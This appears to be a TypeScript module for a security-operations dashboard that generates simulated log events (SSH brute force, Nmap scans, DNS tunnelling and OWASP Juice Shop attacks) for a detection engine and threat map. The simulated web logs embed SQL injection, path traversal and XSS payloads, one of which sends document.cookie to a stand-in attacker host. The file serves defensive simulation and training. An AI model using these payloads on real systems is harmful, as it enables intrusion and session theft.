import { LogEvent, AssetNode, AttackVectorArc } from '../types/soc';
import { evaluateEventSignatures, calculateShannonEntropy } from './detectionEngine';
import { resolveGeoLocation } from './logParser';

export const INITIAL_ASSET_NODES: AssetNode[] = [
  {
    id: 'asset-fw',
    name: 'Perimeter Next-Gen Firewall',
    ip: '10.0.0.1',
    role: 'FIREWALL',
    status: 'HEALTHY',
    openPorts: [443, 80, 53],
    vulnerabilities: [],
    activeThreats: 0,
    position3D: [-3.5, 0, 0]
  },
  {
    id: 'asset-dmz',
    name: 'DMZ Nginx Reverse Proxy',
    ip: '10.0.0.5',
    role: 'DMZ_PROXY',
    status: 'HEALTHY',
    openPorts: [80, 443],
    vulnerabilities: ['CVE-2023-44487 (HTTP/2 Rapid Reset)'],
    activeThreats: 0,
    position3D: [-1.8, 1.2, 0]
  },
  {
    id: 'asset-juice',
    name: 'OWASP Juice Shop Web App',
    ip: '10.0.0.15',
    role: 'JUICE_SHOP_APP',
    status: 'UNDER_ATTACK',
    openPorts: [3000, 80],
    vulnerabilities: ['SQLi in /rest/products/search', 'XSS in Feedbacks', 'Broken Object Level Auth'],
    activeThreats: 3,
    position3D: [0.5, 1.5, 0]
  },
  {
    id: 'asset-auth',
    name: 'LDAP / SSH Bastion Auth Server',
    ip: '10.0.0.22',
    role: 'AUTH_SERVER',
    status: 'UNDER_ATTACK',
    openPorts: [22, 389, 636],
    vulnerabilities: ['Brute-force exposure on SSH port 22'],
    activeThreats: 2,
    position3D: [0.5, -1.5, 0]
  },
  {
    id: 'asset-db',
    name: 'Enterprise PostgreSQL Database',
    ip: '10.0.0.50',
    role: 'DATABASE',
    status: 'HEALTHY',
    openPorts: [5432],
    vulnerabilities: ['Restricted internal subnet only'],
    activeThreats: 0,
    position3D: [2.8, 0, 0]
  },
  {
    id: 'asset-siem',
    name: 'SOC Threat Analytics Core',
    ip: '10.0.0.99',
    role: 'SIEM_CORE',
    status: 'HEALTHY',
    openPorts: [514, 9200, 8000],
    vulnerabilities: [],
    activeThreats: 0,
    position3D: [0, -3.0, 0]
  }
];

const KNOWN_ATTACKER_POOLS = [
  { ip: '185.220.101.5', name: 'Tor Exit Node / Bulletproof', city: 'Frankfurt', country: 'Germany', lat: 50.11, lng: 8.68 },
  { ip: '45.154.255.89', name: 'Kali Linux Hydra Bot', city: 'Amsterdam', country: 'Netherlands', lat: 52.37, lng: 4.90 },
  { ip: '194.26.29.112', name: 'SQLmap / Juice Shop Attacker', city: 'London', country: 'United Kingdom', lat: 51.51, lng: -0.13 },
  { ip: '91.240.118.172', name: 'Nmap Port Scanner IP', city: 'Prague', country: 'Czechia', lat: 50.08, lng: 14.43 },
  { ip: '198.51.100.44', name: 'DNS Tunneling C2 Beacon', city: 'Dallas', country: 'United States', lat: 32.78, lng: -96.80 },
  { ip: '103.251.167.20', name: 'Reconnaissance Probe', city: 'Tokyo', country: 'Japan', lat: 35.68, lng: 139.65 }
];

const NORMAL_USERS = ['alice.dev', 'bob.sec', 'clara.admin', 'devops.svc', 'marketing.user'];
const TARGET_ATTACK_USERS = ['root', 'admin', 'administrator', 'guest', 'test', 'support', 'oracle', 'postgres'];

// Generate initial authentic log event corpus
export function generateInitialCorpus(count: number = 35): LogEvent[] {
  const events: LogEvent[] = [];
  const now = Date.now();

  for (let i = 0; i < count; i++) {
    const timeOffset = (count - i) * 6000; // staggered over past minutes
    const eventTime = new Date(now - timeOffset).toISOString();
    const typeRoll = Math.random();

    if (typeRoll < 0.25) {
      // Hydra Brute Force Failed Login
      const attacker = KNOWN_ATTACKER_POOLS[1];
      const targetUser = TARGET_ATTACK_USERS[Math.floor(Math.random() * TARGET_ATTACK_USERS.length)];
      const raw = `Aug 30 06:14:${String(10 + (i % 40)).padStart(2, '0')} auth-server sshd[${2000 + i}]: Failed password for invalid user ${targetUser} from ${attacker.ip} port ${40000 + i} ssh2`;
      
      const partial: Partial<LogEvent> = {
        id: `EVT-AUTH-${Date.now()}-${i}`,
        timestamp: eventTime,
        sourceIp: attacker.ip,
        destinationIp: '10.0.0.22',
        sourcePort: 40000 + i,
        destinationPort: 22,
        protocol: 'SSH',
        eventType: 'AUTH_FAILED',
        username: targetUser,
        status: 'FAILURE',
        rawPayload: raw,
        details: { toolSignature: 'Hydra' },
        geo: resolveGeoLocation(attacker.ip)
      };
      const evalRes = evaluateEventSignatures(partial);
      events.push({ ...(partial as LogEvent), severity: evalRes.severity, category: evalRes.category, isSuspicious: true });

    } else if (typeRoll < 0.45) {
      // OWASP Juice Shop / DVWA SQL Injection & XSS
      const attacker = KNOWN_ATTACKER_POOLS[2];
      const payloads = [
        "/rest/products/search?q=' UNION SELECT 1, email, password FROM Users --",
        "/api/Feedbacks?comment=<script>alert('XSS_PAYLOAD')</script>",
        "/rest/user/login (POST email: ' OR 1=1 --, password: xxx)",
        "/ftp/eastere.gg?file=../../../../etc/passwd"
      ];
      const selectedPayload = payloads[i % payloads.length];
      const raw = `${attacker.ip} - - [30/Aug/2026:06:15:00 +0000] "GET ${selectedPayload} HTTP/1.1" 403 892`;

      const partial: Partial<LogEvent> = {
        id: `EVT-WEB-${Date.now()}-${i}`,
        timestamp: eventTime,
        sourceIp: attacker.ip,
        destinationIp: '10.0.0.15',
        sourcePort: 51200 + i,
        destinationPort: 80,
        protocol: 'HTTP',
        eventType: 'HTTP_REQUEST',
        username: 'anonymous_attacker',
        status: 'ALERT',
        rawPayload: raw,
        details: {
          url: selectedPayload,
          httpMethod: 'GET',
          httpStatus: 403,
          toolSignature: 'JuiceShopExploit',
          payloadSnippet: selectedPayload
        },
        geo: resolveGeoLocation(attacker.ip)
      };
      const evalRes = evaluateEventSignatures(partial);
      events.push({ ...(partial as LogEvent), severity: evalRes.severity, category: evalRes.category, isSuspicious: true });

    } else if (typeRoll < 0.65) {
      // DNS Tunneling Anomaly
      const attacker = KNOWN_ATTACKER_POOLS[4];
      const encodedChunk = `v7a${Math.random().toString(36).substring(2, 10)}${Math.random().toString(36).substring(2, 10)}9fbc18`;
      const queryDomain = `${encodedChunk}.tunnel.darknet-c2.cc`;
      const entropy = calculateShannonEntropy(encodedChunk);
      const raw = `DNS QRY from ${attacker.ip} for ${queryDomain} TYPE=TXT (Entropy: ${entropy})`;

      const partial: Partial<LogEvent> = {
        id: `EVT-DNS-${Date.now()}-${i}`,
        timestamp: eventTime,
        sourceIp: attacker.ip,
        destinationIp: '10.0.0.1',
        destinationPort: 53,
        protocol: 'DNS',
        eventType: 'DNS_QUERY',
        status: 'ALERT',
        rawPayload: raw,
        details: {
          dnsQuery: queryDomain,
          dnsType: 'TXT',
          dnsEntropy: entropy,
          toolSignature: 'CustomScript'
        },
        geo: resolveGeoLocation(attacker.ip)
      };
      const evalRes = evaluateEventSignatures(partial);
      events.push({ ...(partial as LogEvent), severity: evalRes.severity, category: evalRes.category, isSuspicious: true });

    } else if (typeRoll < 0.80) {
      // Nmap Port Scan Probe
      const attacker = KNOWN_ATTACKER_POOLS[3];
      const targetPorts = [21, 22, 23, 25, 80, 110, 443, 3306, 5432, 8080, 27017];
      const scannedPort = targetPorts[i % targetPorts.length];
      const raw = `Nmap TCP SYN Stealth Scan [1:20012:1] from ${attacker.ip}:49152 -> 10.0.0.15:${scannedPort} Flags:[S] Seq:10294`;

      const partial: Partial<LogEvent> = {
        id: `EVT-SCAN-${Date.now()}-${i}`,
        timestamp: eventTime,
        sourceIp: attacker.ip,
        destinationIp: '10.0.0.15',
        destinationPort: scannedPort,
        protocol: 'TCP',
        eventType: 'PORT_PROBE',
        status: 'ALERT',
        rawPayload: raw,
        details: {
          portScanType: 'SYN_STEALTH',
          toolSignature: 'Nmap'
        },
        geo: resolveGeoLocation(attacker.ip)
      };
      const evalRes = evaluateEventSignatures(partial);
      events.push({ ...(partial as LogEvent), severity: evalRes.severity, category: evalRes.category, isSuspicious: true });

    } else {
      // Normal legitimate traffic
      const user = NORMAL_USERS[i % NORMAL_USERS.length];
      const isAuth = i % 2 === 0;
      const raw = isAuth 
        ? `Aug 30 06:16:00 auth-server sshd[1299]: Accepted publickey for ${user} from 10.0.1.45 port 52331 ssh2`
        : `10.0.1.45 - ${user} [30/Aug/2026:06:16:00 +0000] "GET /api/v1/dashboard HTTP/1.1" 200 1420`;

      events.push({
        id: `EVT-NORM-${Date.now()}-${i}`,
        timestamp: eventTime,
        sourceIp: '10.0.1.45',
        destinationIp: '10.0.0.15',
        destinationPort: isAuth ? 22 : 443,
        protocol: isAuth ? 'SSH' : 'HTTPS',
        eventType: isAuth ? 'AUTH_SUCCESS' : 'HTTP_REQUEST',
        username: user,
        status: 'SUCCESS',
        severity: 'info',
        category: 'normal_traffic',
        rawPayload: raw,
        details: {
          url: isAuth ? undefined : '/api/v1/dashboard',
          httpMethod: isAuth ? undefined : 'GET',
          httpStatus: 200
        },
        geo: { city: 'HQ Office', country: 'Internal LAN', countryCode: 'LAN', lat: 37.77, lng: -122.42 },
        isSuspicious: false
      });
    }
  }

  return events.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
}

/**
 * Generates an active attack scenario burst for on-demand live simulation
 */
export function generateAttackBurst(attackType: 'hydra_bf' | 'nmap_scan' | 'sqli_juiceshop' | 'dns_tunnel'): LogEvent[] {
  const events: LogEvent[] = [];
  const now = Date.now();

  if (attackType === 'hydra_bf') {
    const attacker = KNOWN_ATTACKER_POOLS[1];
    for (let i = 0; i < 6; i++) {
      const u = TARGET_ATTACK_USERS[i % TARGET_ATTACK_USERS.length];
      const partial: Partial<LogEvent> = {
        id: `SIM-BF-${now}-${i}`,
        timestamp: new Date(now - (5 - i) * 1000).toISOString(),
        sourceIp: attacker.ip,
        destinationIp: '10.0.0.22',
        sourcePort: 43210 + i,
        destinationPort: 22,
        protocol: 'SSH',
        eventType: 'AUTH_FAILED',
        username: u,
        status: 'FAILURE',
        rawPayload: `Hydra Kali Linux [SSH]: Failed login attempt for user '${u}' with wordlist pass '${u}123!' from ${attacker.ip}`,
        details: { toolSignature: 'Hydra' },
        geo: resolveGeoLocation(attacker.ip)
      };
      const evalRes = evaluateEventSignatures(partial);
      events.push({ ...(partial as LogEvent), severity: evalRes.severity, category: evalRes.category, isSuspicious: true });
    }
  } else if (attackType === 'nmap_scan') {
    const attacker = KNOWN_ATTACKER_POOLS[3];
    const ports = [21, 22, 80, 443, 3306, 5432, 8080, 27017, 9200];
    ports.forEach((p, idx) => {
      const partial: Partial<LogEvent> = {
        id: `SIM-NMAP-${now}-${idx}`,
        timestamp: new Date(now - (ports.length - idx) * 800).toISOString(),
        sourceIp: attacker.ip,
        destinationIp: '10.0.0.15',
        sourcePort: 55000 + idx,
        destinationPort: p,
        protocol: 'TCP',
        eventType: 'PORT_PROBE',
        status: 'ALERT',
        rawPayload: `Nmap -sS -sV -O probe against 10.0.0.15:${p} Flags:[SYN] Window:1024 TTL:54`,
        details: { portScanType: 'SYN_STEALTH', toolSignature: 'Nmap' },
        geo: resolveGeoLocation(attacker.ip)
      };
      const evalRes = evaluateEventSignatures(partial);
      events.push({ ...(partial as LogEvent), severity: evalRes.severity, category: evalRes.category, isSuspicious: true });
    });
  } else if (attackType === 'sqli_juiceshop') {
    const attacker = KNOWN_ATTACKER_POOLS[2];
    const payloads = [
      "/rest/user/login?email=' OR '1'='1' --&password=test",
      "/rest/products/search?q=qwert')) UNION SELECT id, email, password, role FROM Users--",
      "/api/Feedbacks (POST Payload: {\"comment\": \"<script>fetch('http://attacker.cc/'+document.cookie)</script>\"})",
      "/rest/track-order/1' UNION SELECT 1,2,sqlite_version(),4,5--"
    ];
    payloads.forEach((payload, idx) => {
      const partial: Partial<LogEvent> = {
        id: `SIM-JUICE-${now}-${idx}`,
        timestamp: new Date(now - (payloads.length - idx) * 1200).toISOString(),
        sourceIp: attacker.ip,
        destinationIp: '10.0.0.15',
        sourcePort: 56100 + idx,
        destinationPort: 80,
        protocol: 'HTTP',
        eventType: 'HTTP_REQUEST',
        username: 'sqli_agent',
        status: 'ALERT',
        rawPayload: `${attacker.ip} [OWASP Juice Shop Attack] "POST ${payload} HTTP/1.1" 500 DB_ERROR (SQL syntax near UNION)`,
        details: {
          url: payload,
          httpMethod: 'POST',
          httpStatus: 500,
          toolSignature: 'JuiceShopExploit',
          payloadSnippet: payload
        },
        geo: resolveGeoLocation(attacker.ip)
      };
      const evalRes = evaluateEventSignatures(partial);
      events.push({ ...(partial as LogEvent), severity: evalRes.severity, category: evalRes.category, isSuspicious: true });
    });
  } else if (attackType === 'dns_tunnel') {
    const attacker = KNOWN_ATTACKER_POOLS[4];
    for (let i = 0; i < 4; i++) {
      const chunk = `b3B4c2VjX2RhdGFfZXhmaWw_${i}_${Math.random().toString(36).substring(2, 8)}`;
      const domain = `${chunk}.covert-dns-c2.net`;
      const ent = calculateShannonEntropy(chunk);
      const partial: Partial<LogEvent> = {
        id: `SIM-DNS-${now}-${i}`,
        timestamp: new Date(now - (4 - i) * 1500).toISOString(),
        sourceIp: attacker.ip,
        destinationIp: '10.0.0.1',
        destinationPort: 53,
        protocol: 'DNS',
        eventType: 'DNS_QUERY',
        status: 'ALERT',
        rawPayload: `DNS TXT Query: ${domain} (Entropy: ${ent}) [Cobalt Strike / Iodine Tunneling Signature]`,
        details: {
          dnsQuery: domain,
          dnsType: 'TXT',
          dnsEntropy: ent,
          toolSignature: 'CustomScript'
        },
        geo: resolveGeoLocation(attacker.ip)
      };
      const evalRes = evaluateEventSignatures(partial);
      events.push({ ...(partial as LogEvent), severity: evalRes.severity, category: evalRes.category, isSuspicious: true });
    }
  }

  return events;
}

export function generateAttackArcs(events: LogEvent[]): AttackVectorArc[] {
  const destLat = 37.7749; // SOC HQ lat
  const destLng = -122.4194; // SOC HQ lng

  return events
    .filter(e => e.isSuspicious && e.geo && e.geo.countryCode !== 'LAN')
    .slice(0, 15)
    .map(e => ({
      id: `arc-${e.id}`,
      sourceLat: e.geo.lat,
      sourceLng: e.geo.lng,
      destLat,
      destLng,
      sourceCity: e.geo.city,
      country: e.geo.country,
      severity: e.severity,
      category: e.category,
      progress: Math.random()
    }));
}
